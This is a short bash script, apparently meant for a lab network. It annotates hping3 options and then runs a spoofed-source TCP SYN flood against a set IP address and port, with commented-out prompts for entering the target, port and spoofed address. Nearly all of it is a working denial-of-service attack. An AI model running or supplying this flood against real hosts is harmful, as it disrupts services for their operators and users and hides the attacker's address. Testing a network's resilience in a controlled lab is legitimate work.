#!/bin/bash

# HPING3 commands
# -c –count: packet count
#–faster: alias for -i u1000 (100 packets for second)
# –flood: sent packets as fast as possible. Don’t show replies.
# -V –verbose: verbose mode
# -0 –rawip: RAW IP mode
# -1  –icmp: ICMP mode
# -2 –udp: UDP mode
# -8 –scan: SCAN mode.
# -9 –listen: listen mode
# -a –spoof: spoof source address
# -C –icmptype: icmp type
# -K –icmpcode: icmp code
# -L –setack: set TCP ack
# -F –fin: set FIN flag
# -S  –syn: set SYN flag
# -R  –rst: set RST flag
# -A –ack: set ACK flag
# -X –xmas: set X unused flag (0x40)
# -Y –ymas: set Y unused flag (0x80)

#echo "OK, confirm your are ROOT! :D";
#echo "Proceeding Hping3 with TCP SYN Flood Mode :D";
target='192.168.2.65';
#read -p "Enter target IP [192.168.2.65]: " target;
#read -p "Enter spoofed IP [192.168.2.240]: " spoofAddr;
spoofAddr='192.168.2.240';
port='8082';
#read -p "Enter target port [8081/8082/20145]: " port;

#hping3 -S $target $spoofAddr -p $port --flood;
hping3 -S $target --spoof $spoofAddr -p $port --flood -V;
